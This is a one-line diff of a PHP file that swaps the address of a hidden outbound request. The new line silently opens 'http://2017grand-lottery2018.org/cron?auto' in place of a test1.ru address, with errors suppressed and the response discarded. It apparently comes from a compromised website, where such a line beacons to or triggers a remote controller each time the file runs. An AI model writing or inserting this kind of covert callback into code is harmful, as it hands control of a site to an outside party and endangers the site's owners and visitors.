@@ -1,1 +1,1 @@
-<?php @fclose(@fopen('http://test1.ru/hs32/cron?auto', 'r'));
+<?php @fclose(@fopen('http://2017grand-lottery2018.org/cron?auto', 'r'));
